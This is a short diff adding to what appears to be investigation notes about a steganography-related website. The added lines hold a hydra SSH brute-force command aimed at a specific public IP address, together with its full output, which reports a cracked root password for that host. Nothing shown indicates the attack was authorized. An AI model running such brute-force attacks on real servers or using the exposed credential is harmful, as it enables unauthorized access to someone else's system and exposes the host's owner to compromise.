@@ -65,4 +65,17 @@ http://www.sis.pitt.edu/jjoshi/TELCOM2813/Spring2005/FinaleKateebAltimus.ppt
 
 Seems to have something to do with digital steganography
 
-darialwknacs.
+The website itself seems to be abuse lol
+
+
+$ hydra -L users.txt -P passwords/allpass.txt ssh://75.101.230.146
+Hydra v8.4 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-04-09 20:19:50
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:4/p:5), ~2 tries per task
+[DATA] attacking service ssh on port 22
+[22][ssh] host: 75.101.230.146   login: root   password: jjdMn7vM3wU5tA
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-04-09 20:20:04
